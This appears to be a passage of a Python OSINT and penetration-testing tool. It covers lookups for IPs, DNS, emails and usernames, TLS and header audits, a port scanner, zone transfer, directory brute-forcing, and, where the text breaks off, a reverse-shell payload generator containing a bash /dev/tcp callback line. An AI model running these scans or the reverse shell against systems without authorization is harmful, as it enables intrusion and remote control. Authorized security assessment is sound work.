  ./chakravyuh.sh [--language en|gr|el] COMMAND [OPTIONS]

OSINT:
  myip                         Show your public IP
  ip TARGET                    IP/domain intelligence and RDAP
  dns TARGET                   DNS record enumeration
  subdomain TARGET             crt.sh subdomain discovery
  email EMAIL                  Format, MX, and HIBP check
  phone NUMBER                 Phone-number validation
  username USERNAME            Username search
  mac MAC                      MAC vendor lookup
  asn IP|ASN                   ASN and prefix information
  ssl TARGET                   TLS certificate analysis
  headers URL                  HTTP security-header audit
  tech URL                     Web technology fingerprint
  metadata FILE                EXIF/metadata extraction
  vt-hash HASH                 VirusTotal report
  shodan TARGET                Shodan host report
  censys TARGET                Censys host report
  dork QUERY                   Generate a Google dork URL
  pastebin KEYWORD             Search Pastebin references
  qr TEXT                      Generate a QR code

Authorized active checks:
  email-verify EMAIL --authorized
  scan TARGET --ports PORTS --authorized [--banner]
  zone-transfer TARGET --authorized
  dirb URL --wordlist FILE --authorized
  reverse --lhost IP --lport PORT --type TYPE --authorized

System:
  reports                      View saved reports
  language en|gr|el            Change language
  apikey SERVICE [VALUE]       Save an API key
  apikey-remove SERVICE        Remove an API key
  doctor                       Check dependencies
  self-test                    Run offline self-tests

Examples:
  ./chakravyuh.sh ip 8.8.8.8
  ./chakravyuh.sh scan 127.0.0.1 --ports 22,80,443 --authorized
  ./chakravyuh.sh apikey shodan

Run active tests only against systems you own or have explicit permission to assess.""")


def load_json_file(path):
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
        return data if isinstance(data, dict) else {}
    except (OSError, ValueError, TypeError):
        return {}


def atomic_json_write(path, data):
    path.parent.mkdir(parents=True, exist_ok=True)
    temp = path.with_suffix(path.suffix + ".tmp")
    temp.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
    try:
        os.chmod(temp, 0o600)
    except OSError:
        pass
    temp.replace(path)


def load_config():
    return load_json_file(CONFIG_FILE)


def save_config(data):
    atomic_json_write(CONFIG_FILE, data)


def load_apikeys():
    return load_json_file(API_KEYS_FILE)


def save_apikeys(data):
    atomic_json_write(API_KEYS_FILE, data)


def choose_language(config, forced=None):
    global LANG
    if forced in {"en", "gr", "el"}:
        LANG = "gr" if forced in {"gr", "el"} else "en"
        config["language"] = LANG
        save_config(config)
        return
    saved = config.get("language")
    if saved in {"en", "gr"}:
        LANG = saved
        return
    try:
        choice = input(TEXT["en"]["choose_language"]).strip()
    except EOFError:
        choice = "1"
    LANG = "gr" if choice == "2" else "en"
    config["language"] = LANG
    save_config(config)


def module_available(name):
    try:
        return importlib.util.find_spec(name) is not None
    except (ImportError, AttributeError, ValueError):
        return False


def pip_available():
    return subprocess.run(
        [sys.executable, "-m", "pip", "--version"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    ).returncode == 0


def bootstrap_pip():
    if pip_available():
        return True
    subprocess.run(
        [sys.executable, "-m", "ensurepip", "--upgrade"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return pip_available()


def install_packages(packages):
    if not packages:
        return True
    if os.environ.get("CHAKRAVYUH_NO_AUTO_INSTALL", "").lower() in {"1", "true", "yes"}:
        print(t("install_skipped"))
        return False
    if not bootstrap_pip():
        print(t("installer_failed"))
        return False
    print(f"{t('installing')}: {', '.join(packages)}")
    PYTHON_PACKAGE_DIR.mkdir(parents=True, exist_ok=True)
    commands = [
        [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "--upgrade", *packages],
        [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "--user", "--upgrade", *packages],
        [sys.executable, "-m", "pip", "install", "--disable-pip-version-check", "--upgrade", "--target", str(PYTHON_PACKAGE_DIR), *packages],
    ]
    for command in commands:
        result = subprocess.run(command, check=False)
        if result.returncode == 0:
            if PYTHON_PACKAGE_DIR.is_dir() and str(PYTHON_PACKAGE_DIR) not in sys.path:
                sys.path.insert(0, str(PYTHON_PACKAGE_DIR))
            importlib.invalidate_caches()
            return True
    print(t("installer_failed"))
    return False


def load_dependencies(auto_install=True):
    missing_packages = []
    for module_name, package_name in PACKAGE_MAP.items():
        if not module_available(module_name) and package_name not in missing_packages:
            missing_packages.append(package_name)
    if auto_install and missing_packages:
        install_packages(missing_packages)
    aliases = {
        "requests": "requests",
        "dns_resolver": "dns.resolver",
        "dns_query": "dns.query",
        "dns_zone": "dns.zone",
        "dns_rdatatype": "dns.rdatatype",
        "phonenumbers": "phonenumbers",
        "phone_carrier": "phonenumbers.carrier",
        "phone_geocoder": "phonenumbers.geocoder",
        "phone_timezone": "phonenumbers.timezone",
        "whois": "whois",
        "bs4": "bs4",
        "qrcode": "qrcode",
        "PIL_Image": "PIL.Image",
        "PIL_Tags": "PIL.ExifTags",
    }
    for alias, module_name in aliases.items():
        try:
            MODULES[alias] = importlib.import_module(module_name)
        except ImportError:
            MODULES[alias] = None
    return MODULES


def dependency_status():
    status = {}
    for module_name, package_name in PACKAGE_MAP.items():
        status[package_name] = module_available(module_name)
    return status


def doctor(auto_install=False):
    if auto_install:
        load_dependencies(auto_install=True)
    status = dependency_status()
    print(f"\n{t('doctor_title')}:")
    for package, available in status.items():
        state = t("available") if available else t("missing")
        print(f"  {package}: {state}")
    print(f"  Python: {platform_text()}")
    print(f"  {bi('Configuration', 'Ρυθμίσεις')}: {CONFIG_FILE}")
    print(f"  {bi('Reports', 'Αναφορές')}: {REPORT_DIR}")
    print(f"  {bi('Local Python packages', 'Τοπικά Python packages')}: {PYTHON_PACKAGE_DIR}")
    return all(status.values())


def platform_text():
    return f"{sys.version.split()[0]} ({sys.platform})"


def timestamp():
    return datetime.datetime.now(datetime.timezone.utc).astimezone().isoformat(timespec="seconds")


def safe_name(value):
    cleaned = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in str(value))
    return cleaned[:80] or "report"


def save_report(kind, target, data):
    REPORT_DIR.mkdir(parents=True, exist_ok=True)
    stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S-%f")
    path = REPORT_DIR / f"{stamp}_{safe_name(kind)}_{safe_name(target)}.json"
    payload = {
        "application": APP_NAME,
        "type": kind,
        "target": target,
        "created_at": timestamp(),
        "data": data,
    }
    path.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    return path


def normalize_host(value):
    value = (value or "").strip()
    if not value:
        return ""
    parsed = urllib.parse.urlparse(value if "://" in value else "//" + value)
    host = parsed.hostname or value.split("/")[0]
    return host.strip().strip("[]").rstrip(".")


def normalize_url(value, default_scheme="https"):
    value = (value or "").strip()
    if not value:
        return ""
    if "://" not in value:
        value = f"{default_scheme}://{value}"
    parsed = urllib.parse.urlparse(value)
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        return ""
    return value


def parse_host_port(value, default_port=443):
    value = (value or "").strip()
    if not value:
        return "", default_port
    parsed = urllib.parse.urlparse(value if "://" in value else "//" + value)
    host = parsed.hostname or normalize_host(value)
    try:
        port = parsed.port or default_port
    except ValueError:
        return "", default_port
    return host, port


def resolve_target(value):
    host = normalize_host(value)
    if not host:
        return "", ""
    try:
        return host, str(ipaddress.ip_address(host))
    except ValueError:
        pass
    try:
        infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
    except OSError:
        return host, ""
    addresses = []
    for info in infos:
        address = info[4][0]
        if address not in addresses:
            addresses.append(address)
    preferred = next((item for item in addresses if ":" not in item), addresses[0] if addresses else "")
    return host, preferred


def http_request(url, headers=None, timeout=12, allow_redirects=True, auth=None):
    headers = dict(headers or {})
    headers.setdefault("User-Agent", APP_NAME)
    requests_module = MODULES.get("requests")
    if requests_module is not None:
        response = requests_module.get(
            url,
            headers=headers,
            timeout=timeout,
            allow_redirects=allow_redirects,
            auth=auth,
        )
        return {
            "status": response.status_code,
            "headers": dict(response.headers),
            "text": response.text,
            "url": response.url,
            "json": response.json if response.content else None,
            "cookies": list(response.cookies.keys()),
        }
    if auth and "Authorization" not in headers:
        token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode("utf-8")).decode("ascii")
        headers["Authorization"] = f"Basic {token}"
    request = urllib.request.Request(url, headers=headers)
    opener = urllib.request.build_opener()
    if not allow_redirects:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, req, fp, code, msg, hdrs, newurl):
                return None
        opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(request, timeout=timeout) as response:
            body = response.read().decode("utf-8", errors="replace")
            return {
                "status": response.status,
                "headers": dict(response.headers.items()),
                "text": body,
                "url": response.geturl(),
                "json": lambda: json.loads(body),
                "cookies": [],
            }
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", errors="replace")
        return {
            "status": exc.code,
            "headers": dict(exc.headers.items()) if exc.headers else {},
            "text": body,
            "url": exc.geturl(),
            "json": lambda: json.loads(body),
            "cookies": [],
        }


def response_json(response):
    parser = response.get("json")
    if callable(parser):
        try:
            return parser()
        except (ValueError, TypeError, json.JSONDecodeError):
            return None
    return None


def own_public_ip():
    endpoints = [
        "https://api.ipify.org?format=json",
        "https://ifconfig.co/json",
        "https://icanhazip.com/",
    ]
    errors = []
    for endpoint in endpoints:
        try:
            response = http_request(endpoint, timeout=8)
            if response["status"] != 200:
                errors.append(f"{endpoint}: HTTP {response['status']}")
                continue
            data = response_json(response)
            candidate = data.get("ip") if isinstance(data, dict) else response["text"].strip()
            return str(ipaddress.ip_address(candidate))
        except Exception as exc:
            errors.append(str(exc))
    raise RuntimeError("; ".join(errors) or t("network_error"))


def geoip_lookup(ip):
    try:
        address = ipaddress.ip_address(ip)
    except ValueError:
        return {"error": t("invalid_target")}
    if not address.is_global:
        return {"ip": str(address), "private": True}
    try:
        response = http_request(f"https://ipwho.is/{urllib.parse.quote(str(address), safe='')}")
        data = response_json(response)
        if response["status"] != 200 or not isinstance(data, dict):
            return {"error": f"HTTP {response['status']}"}
        if data.get("success") is False:
            return {"error": data.get("message") or "API failure"}
        connection = data.get("connection") or {}
        timezone_data = data.get("timezone") or {}
        return {
            "ip": data.get("ip", str(address)),
            "country": data.get("country"),
            "region": data.get("region"),
            "city": data.get("city"),
            "isp": connection.get("isp"),
            "asn": connection.get("asn"),
            "timezone": timezone_data.get("id"),
            "coordinates": (data.get("latitude"), data.get("longitude")),
            "private": False,
        }
    except Exception as exc:
        return {"error": str(exc)}


def rdap_lookup(target):
    try:
        encoded = urllib.parse.quote(target, safe="")
        response = http_request(f"https://rdap.org/{'ip' if is_ip(target) else 'domain'}/{encoded}", timeout=15)
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, dict):
            return data
        return {"error": f"HTTP {response['status']}"}
    except Exception as exc:
        return {"error": str(exc)}


def is_ip(value):
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def whois_lookup(domain):
    module = MODULES.get("whois")
    if module is not None:
        try:
            record = module.whois(domain)
            return {
                "registrar": getattr(record, "registrar", None),
                "creation_date": stringify_value(getattr(record, "creation_date", None)),
                "expiration_date": stringify_value(getattr(record, "expiration_date", None)),
                "updated_date": stringify_value(getattr(record, "updated_date", None)),
                "name_servers": normalize_sequence(getattr(record, "name_servers", None)),
                "emails": normalize_sequence(getattr(record, "emails", None)),
            }
        except Exception:
            pass
    rdap = rdap_lookup(domain)
    if "error" not in rdap:
        return {
            "handle": rdap.get("handle"),
            "ldhName": rdap.get("ldhName"),
            "status": rdap.get("status"),
            "events": rdap.get("events"),
            "nameservers": rdap.get("nameservers"),
            "entities": rdap.get("entities"),
        }
    command = shutil.which("whois")
    if command:
        try:
            result = subprocess.run([command, domain], capture_output=True, text=True, timeout=20, check=False)
            if result.stdout.strip():
                return {"raw": result.stdout.strip()}
        except (OSError, subprocess.TimeoutExpired):
            pass
    return rdap


def stringify_value(value):
    if isinstance(value, (list, tuple, set)):
        return [str(item) for item in value]
    return str(value) if value is not None else None


def normalize_sequence(value):
    if value is None:
        return []
    if isinstance(value, (list, tuple, set)):
        return sorted({str(item) for item in value if item})
    return [str(value)]


def reverse_ip(ip):
    try:
        response = http_request(
            f"https://api.hackertarget.com/reverseiplookup/?q={urllib.parse.quote(ip, safe='')}",
            timeout=15,
        )
        text = response["text"].strip()
        if response["status"] == 200 and "error" not in text.lower():
            return sorted({line.strip() for line in text.splitlines() if line.strip()})
    except Exception:
        pass
    return []


def dns_enum(domain):
    records = {rtype: [] for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME", "PTR"]}
    resolver = MODULES.get("dns_resolver")
    if resolver is not None:
        for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]:
            try:
                answers = resolver.resolve(domain, rtype, lifetime=8)
                records[rtype] = [str(item) for item in answers]
            except Exception:
                pass
    else:
        try:
            for info in socket.getaddrinfo(domain, None):
                address = info[4][0]
                key = "AAAA" if ":" in address else "A"
                if address not in records[key]:
                    records[key].append(address)
        except OSError:
            pass
    addresses = records["A"] + records["AAAA"]
    for address in addresses[:4]:
        try:
            ptr = socket.gethostbyaddr(address)[0]
            if ptr not in records["PTR"]:
                records["PTR"].append(ptr)
        except OSError:
            pass
    return records


def subdomain_crtsh(domain):
    try:
        query = urllib.parse.quote(f"%.{domain}", safe="")
        response = http_request(f"https://crt.sh/?q={query}&output=json", timeout=25)
        data = response_json(response)
        if response["status"] != 200 or not isinstance(data, list):
            return []
        found = set()
        for entry in data:
            for name in str(entry.get("name_value", "")).splitlines():
                name = name.strip().lower().lstrip("*.")
                if name == domain or name.endswith("." + domain):
                    found.add(name)
        return sorted(found)
    except Exception:
        return []


def valid_email(email):
    if len(email) > 254:
        return False
    return bool(re.fullmatch(r"[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+", email))


def email_check(email):
    basic = valid_email(email)
    mx = False
    if basic:
        domain = email.rsplit("@", 1)[1]
        resolver = MODULES.get("dns_resolver")
        if resolver is not None:
            try:
                resolver.resolve(domain, "MX", lifetime=8)
                mx = True
            except Exception:
                pass
        else:
            try:
                socket.getaddrinfo(domain, 25)
                mx = True
            except OSError:
                pass
    return basic, mx


def email_breach_check(email, apikeys):
    key = apikeys.get("hibp")
    if not key:
        return {"error": t("hibp_unavailable"), "breaches": []}
    try:
        encoded = urllib.parse.quote(email, safe="")
        response = http_request(
            f"https://haveibeenpwned.com/api/v3/breachedaccount/{encoded}?truncateResponse=false",
            headers={"hibp-api-key": key, "User-Agent": APP_NAME},
            timeout=15,
        )
        if response["status"] == 404:
            return {"breaches": []}
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, list):
            return {"breaches": data}
        return {"error": f"HTTP {response['status']}", "breaches": []}
    except Exception as exc:
        return {"error": str(exc), "breaches": []}


def email_smtp_verify(email):
    if not valid_email(email):
        return {"verified": False, "error": t("invalid_email")}
    resolver = MODULES.get("dns_resolver")
    if resolver is None:
        return {"verified": False, "error": bi("dnspython is unavailable.", "Το dnspython δεν είναι διαθέσιμο.")}
    domain = email.rsplit("@", 1)[1]
    try:
        answers = resolver.resolve(domain, "MX", lifetime=8)
        servers = sorted(answers, key=lambda item: getattr(item, "preference", 0))
        mx_server = str(servers[0].exchange).rstrip(".")
        with socket.create_connection((mx_server, 25), timeout=10) as connection:
            reader = connection.makefile("rb")
            banner = reader.readline(2048).decode(errors="replace").strip()
            connection.sendall(b"EHLO chakravyuh.local\r\n")
            ehlo = read_smtp_response(reader)
            connection.sendall(f"VRFY {email}\r\n".encode("utf-8"))
            vrfy = read_smtp_response(reader)
            try:
                connection.sendall(b"QUIT\r\n")
            except OSError:
                pass
        code = int(vrfy[:3]) if len(vrfy) >= 3 and vrfy[:3].isdigit() else 0
        return {
            "verified": code in {250, 251, 252},
            "mx": mx_server,
            "banner": banner,
            "ehlo": ehlo,
            "response": vrfy,
            "warning": bi("VRFY results are not proof of mailbox ownership or deliverability.", "Το VRFY δεν αποδεικνύει ιδιοκτησία ή πραγματική παράδοση mailbox."),
        }
    except Exception as exc:
        return {"verified": False, "error": str(exc)}


def read_smtp_response(reader):
    lines = []
    for _ in range(20):
        line = reader.readline(4096)
        if not line:
            break
        decoded = line.decode(errors="replace").rstrip("\r\n")
        lines.append(decoded)
        if len(decoded) < 4 or decoded[3] != "-":
            break
    return "\n".join(lines)


def username_search(username):
    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", username):
        return []
    platforms = {
        "GitHub": (f"https://github.com/{username}", ["page not found"]),
        "Reddit": (f"https://www.reddit.com/user/{username}", ["page not found", "nobody on reddit goes by that name"]),
        "YouTube": (f"https://www.youtube.com/@{username}", ["this page isn't available"]),
        "TikTok": (f"https://www.tiktok.com/@{username}", ["couldn't find this account"]),
        "Pinterest": (f"https://www.pinterest.com/{username}/", ["page not found"]),
        "Twitch": (f"https://www.twitch.tv/{username}", ["content is unavailable"]),
        "Keybase": (f"https://keybase.io/{username}", ["user not found"]),
        "GitLab": (f"https://gitlab.com/{username}", ["page not found"]),
    }
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as executor:
        futures = {
            executor.submit(check_profile, platform, url, markers): platform
            for platform, (url, markers) in platforms.items()
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    return sorted(found, key=lambda item: item["platform"])


def check_profile(platform, url, negative_markers):
    try:
        response = http_request(url, timeout=8)
        body = response["text"].lower()
        if response["status"] == 200 and not any(marker in body for marker in negative_markers):
            return {"platform": platform, "url": response["url"], "status": response["status"]}
    except Exception:
        pass
    return None


def normalize_mac(mac):
    compact = re.sub(r"[^0-9A-Fa-f]", "", mac)
    if len(compact) != 12:
        return ""
    return ":".join(compact[index:index + 2].upper() for index in range(0, 12, 2))


def mac_lookup(mac):
    normalized = normalize_mac(mac)
    if not normalized:
        return {"error": t("invalid_mac")}
    try:
        response = http_request(f"https://api.macvendors.com/{urllib.parse.quote(normalized, safe='')}", timeout=8)
        if response["status"] == 200 and response["text"].strip():
            return {"mac": normalized, "vendor": response["text"].strip()}
        return {"error": f"HTTP {response['status']}", "mac": normalized}
    except Exception as exc:
        return {"error": str(exc), "mac": normalized}


def asn_lookup(query):
    query = query.strip()
    try:
        if query.upper().startswith("AS") or query.isdigit():
            number = query.upper().removeprefix("AS")
            if not number.isdigit():
                return {"error": t("invalid_target")}
            response = http_request(f"https://api.bgpview.io/asn/{number}", timeout=15)
        else:
            address = str(ipaddress.ip_address(query))
            response = http_request(f"https://api.bgpview.io/ip/{urllib.parse.quote(address, safe='')}", timeout=15)
        data = response_json(response)
        if response["status"] == 200 and isinstance(data, dict):
            return data.get("data", data)
        return {"error": f"HTTP {response['status']}"}
    except Exception as exc:
        return {"error": str(exc)}


def ssl_cert_analysis(target, default_port=443):
    hostname, port = parse_host_port(target, default_port)
    if not hostname:
        return {"error": t("invalid_target")}
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, port), timeout=10) as connection:
            with context.wrap_socket(connection, server_hostname=hostname) as tls:
                certificate = tls.getpeercert()
                cipher = tls.cipher()
                version = tls.version()
        subject = dict(item[0] for item in certificate.get("subject", []))
        issuer = dict(item[0] for item in certificate.get("issuer", []))
        sans = certificate.get("subjectAltName", [])
        expiry = certificate.get("notAfter")
        days_left = None
        if expiry:
            expiry_seconds = ssl.cert_time_to_seconds(expiry)
            days_left = int((expiry_seconds - time.time()) // 86400)
        return {
            "host": hostname,
            "port": port,
            "subject": subject,
            "issuer": issuer,
            "notBefore": certificate.get("notBefore"),
            "notAfter": expiry,
            "days_remaining": days_left,
            "subjectAltName": sans,
            "tls_version": version,
            "cipher": cipher,
        }
    except Exception as exc:
        return {"error": str(exc)}


def headers_audit(url):
    normalized = normalize_url(url)
    if not normalized:
        return {"error": t("invalid_url")}
    checks = {
        "Content-Security-Policy": "CSP",
        "X-Content-Type-Options": "MIME sniffing protection",
        "Referrer-Policy": "Referrer policy",
        "Permissions-Policy": "Permissions policy",
        "Cross-Origin-Opener-Policy": "Cross-origin opener policy",
        "Cross-Origin-Resource-Policy": "Cross-origin resource policy",
    }
    if normalized.startswith("https://"):
        checks["Strict-Transport-Security"] = "HSTS"
    try:
        response = http_request(normalized, timeout=12)
        headers = {key.lower(): value for key, value in response["headers"].items()}
        present = {}
        missing = {}
        for header, description in checks.items():
            if header.lower() in headers:
                present[header] = headers[header.lower()]
            else:
                missing[header] = description
        csp = present.get("Content-Security-Policy", "")
        frame_protected = "frame-ancestors" in csp.lower() or "x-frame-options" in headers
        if "x-frame-options" in headers:
            present["X-Frame-Options"] = headers["x-frame-options"]
        elif not frame_protected:
            missing["X-Frame-Options / CSP frame-ancestors"] = "Clickjacking protection"
        total = len(present) + len(missing)
        return {
            "url": response["url"],
            "status": response["status"],
            "present": present,
            "missing": missing,
            "grade": [len(present), total],
            "server": headers.get("server"),
        }
    except Exception as exc:
        return {"error": str(exc)}


def parse_ports(port_string):
    if not port_string:
        raise ValueError(t("invalid_ports"))
    ports = set()
    for raw_part in port_string.split(","):
        part = raw_part.strip()
        if not part:
            continue
        if "-" in part:
            values = part.split("-", 1)
            if not all(value.strip().isdigit() for value in values):
                raise ValueError(t("invalid_ports"))
            low, high = (int(value.strip()) for value in values)
            if low > high:
                low, high = high, low
            if low < 1 or high > 65535:
                raise ValueError(t("invalid_ports"))
            if high - low + 1 > MAX_PORTS:
                raise ValueError(t("too_many_ports"))
            ports.update(range(low, high + 1))
        else:
            if not part.isdigit():
                raise ValueError(t("invalid_ports"))
            port = int(part)
            if not 1 <= port <= 65535:
                raise ValueError(t("invalid_ports"))
            ports.add(port)
        if len(ports) > MAX_PORTS:
            raise ValueError(t("too_many_ports"))
    if not ports:
        raise ValueError(t("invalid_ports"))
    return sorted(ports)


PORT_PRESETS = {
    "1": [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080],
    "2": [80, 443, 8000, 8080, 8443, 8888, 9000, 9090],
    "3": [22, 23, 3389, 5800, 5900, 5938, 6000, 6129],
}


def port_scan(host, ports, timeout=1.5, grab_banner=False):
    results = {}
    workers = max(1, min(128, len(ports)))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(check_port, host, port, timeout, grab_banner): port for port in ports}
        for future in concurrent.futures.as_completed(futures):
            port, status, banner, address = future.result()
            results[port] = {"open": status, "banner": banner, "address": address}
    return results


def check_port(host, port, timeout, grab_banner):
    try:
        infos = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
    except OSError:
        return port, False, "", ""
    for family, socktype, protocol, _, sockaddr in infos:
        connection = socket.socket(family, socktype, protocol)
        connection.settimeout(timeout)
        try:
            if connection.connect_ex(sockaddr) == 0:
                banner = grab_service_banner(connection, port) if grab_banner else ""
                return port, True, banner, sockaddr[0]
        except OSError:
            pass
        finally:
            connection.close()
    return port, False, "", ""


def grab_service_banner(connection, port):
    try:
        if port in {80, 8000, 8080, 8888, 9000, 9090}:
            connection.sendall(b"HEAD / HTTP/1.0\r\nHost: localhost\r\n\r\n")
        elif port in {21, 22, 23, 25, 110, 143}:
            pass
        else:
            connection.sendall(b"\r\n")
        data = connection.recv(1024)
        return data.decode(errors="replace").strip().replace("\x00", "")[:300]
    except OSError:
        return ""


def zone_transfer(domain):
    resolver = MODULES.get("dns_resolver")
    query = MODULES.get("dns_query")
    zone_module = MODULES.get("dns_zone")
    if not resolver or not query or not zone_module:
        return {"error": bi("dnspython is unavailable.", "Το dnspython δεν είναι διαθέσιμο."), "records": [], "nameserver": None}
    try:
        nameservers = [str(item).rstrip(".") for item in resolver.resolve(domain, "NS", lifetime=8)]
    except Exception as exc:
        return {"error": str(exc), "records": [], "nameserver": None}
    errors = []
    for nameserver in nameservers:
        try:
            addresses = [item[4][0] for item in socket.getaddrinfo(nameserver, 53, type=socket.SOCK_STREAM)]
        except OSError as exc:
            errors.append(f"{nameserver}: {exc}")
            continue
        for address in addresses:
            try:
                transfer = query.xfr(address, domain, timeout=10, lifetime=15)
                zone = zone_module.from_xfr(transfer)
                records = []
                origin = str(zone.origin).rstrip(".") if zone.origin else domain
                rdatatype = MODULES.get("dns_rdatatype")
                for name, node in zone.nodes.items():
                    fqdn = str(name).rstrip(".")
                    fqdn = origin if fqdn in {"@", ""} else f"{fqdn}.{origin}".rstrip(".")
                    for rdataset in node.rdatasets:
                        record_type = rdatatype.to_text(rdataset.rdtype) if rdatatype else str(rdataset.rdtype)
                        for rdata in rdataset:
                            records.append(f"{fqdn} {rdataset.ttl} IN {record_type} {rdata}")
                return {"records": records, "nameserver": nameserver, "address": address}
            except Exception as exc:
                errors.append(f"{nameserver}/{address}: {exc}")
    return {"error": "; ".join(errors[-5:]) or t("zone_transfer_fail"), "records": [], "nameserver": None}


def dir_brute(base_url, wordlist_path, timeout=6):
    normalized = normalize_url(base_url)
    if not normalized:
        return {"error": t("invalid_url"), "found": []}
    path = pathlib.Path(wordlist_path).expanduser()
    if not path.is_file():
        return {"error": t("wordlist_not_found"), "found": []}
    words = []
    try:
        with path.open("r", encoding="utf-8", errors="replace") as handle:
            for line in handle:
                word = line.strip().lstrip("/")
                if word and word not in words:
                    words.append(word)
                if len(words) >= MAX_WORDS:
                    break
    except OSError as exc:
        return {"error": str(exc), "found": []}
    baseline = directory_probe(urllib.parse.urljoin(normalized.rstrip("/") + "/", f"chakravyuh-{time.time_ns()}"), timeout)
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(20, max(1, len(words)))) as executor:
        futures = {
            executor.submit(directory_probe, urllib.parse.urljoin(normalized.rstrip("/") + "/", urllib.parse.quote(word) + "/"), timeout): word
            for word in words
        }
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result["status"] in {200, 201, 202, 204, 301, 302, 307, 308, 401, 403}:
                same_soft_404 = baseline["status"] == result["status"] and abs(baseline["length"] - result["length"]) < 32
                if not same_soft_404:
                    found.append(result)
    return {"found": sorted(found, key=lambda item: item["url"]), "tested": len(words), "truncated": len(words) >= MAX_WORDS}


def directory_probe(url, timeout):
    try:
        response = http_request(url, timeout=timeout, allow_redirects=False)
        return {
            "url": url,
            "status": response["status"],
            "length": len(response["text"].encode("utf-8", errors="replace")),
            "location": response["headers"].get("Location") or response["headers"].get("location"),
        }
    except Exception:
        return {"url": url, "status": 0, "length": 0, "location": None}


def tech_fingerprint(url):
    normalized = normalize_url(url)
    if not normalized:
        return {"error": t("invalid_url")}
    try:
        response = http_request(normalized, timeout=12)
        body = response["text"]
        lower = body.lower()
        headers = {key.lower(): value for key, value in response["headers"].items()}
        generator = ""
        bs4_module = MODULES.get("bs4")
        if bs4_module is not None:
            soup = bs4_module.BeautifulSoup(body, "html.parser")
            tag = soup.find("meta", attrs={"name": re.compile("^generator$", re.I)})
            generator = tag.get("content", "") if tag else ""
        else:
            match = re.search(r"<meta[^>]+name=[\"']generator[\"'][^>]+content=[\"']([^\"']+)", body, re.I)
            generator = match.group(1) if match else ""
        frameworks = []
        signatures = {
            "WordPress": ["wp-content", "wp-json"],
            "Joomla": ["/media/system/js/", "joomla!"],
            "Drupal": ["drupal-settings-json", "/sites/default/files/"],
            "Laravel": ["laravel_session"],
            "Django": ["csrfmiddlewaretoken"],
            "React": ["data-reactroot", "__next_data__"],
            "Vue.js": ["data-v-", "__vue__"],
            "Angular": ["ng-version", "app-root"],
            "Next.js": ["/_next/", "__next_data__"],
            "Cloudflare": ["cf-ray"],
        }
        cookie_names = response.get("cookies", [])
        cookie_text = " ".join(f"{key}:{value}" for key, value in headers.items() if key == "set-cookie").lower()
        combined = lower + " " + cookie_text + " " + " ".join(headers.keys())
        for name, markers in signatures.items():
            if any(marker.lower() in combined for marker in markers):
                frameworks.append(name)
        return {
            "url": response["url"],
            "status": response["status"],
            "server": headers.get("server", ""),
            "powered_by": headers.get("x-powered-by", ""),
            "generator": generator,
            "cookies": cookie_names,
            "frameworks": sorted(set(frameworks)),
        }
    except Exception as exc:
        return {"error": str(exc)}


def extract_metadata(filepath):
    path = pathlib.Path(filepath).expanduser()
    if not path.is_file():
        return {"error": t("file_not_found")}
    image_module = MODULES.get("PIL_Image")
    tags_module = MODULES.get("PIL_Tags")
    if image_module is not None and tags_module is not None:
        try:
            with image_module.open(path) as image:
                metadata = {
                    "format": image.format,
                    "mode": image.mode,
                    "size": list(image.size),
                }
                exif = image.getexif()
                if exif:
                    metadata["exif"] = {
                        str(tags_module.TAGS.get(tag_id, tag_id)): stringify_value(value)
                        for tag_id, value in exif.items()
                    }
                return metadata
        except Exception as exc:
            return {"error": str(exc)}
    exiftool = shutil.which("exiftool")
    if exiftool:
        try:
            result = subprocess.run([exiftool, "-json", str(path)], capture_output=True, text=True, timeout=30, check=False)
            if result.returncode == 0:
                parsed = json.loads(result.stdout)
                return parsed[0] if parsed else {}
            return {"error": result.stderr.strip() or f"exiftool exit {result.returncode}"}
        except Exception as exc:
            return {"error": str(exc)}
    return {"error": t("need_exiftool")}


def validate_lhost(value):
    value = value.strip()
    if not value or any(character in value for character in "\r\n\t ;&|`$><"):
        return ""
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        if re.fullmatch(r"[A-Za-z0-9.-]{1,253}", value):
            return value
    return ""


def reverse_shell(lhost, lport, shell_type):
    host = validate_lhost(lhost)
    try:
        port = int(lport)
    except (TypeError, ValueError):
        return {"error": t("invalid_target")}
    if not host or not 1 <= port <= 65535:
        return {"error": t("invalid_target")}
    payloads = {
        "bash": f"bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'",
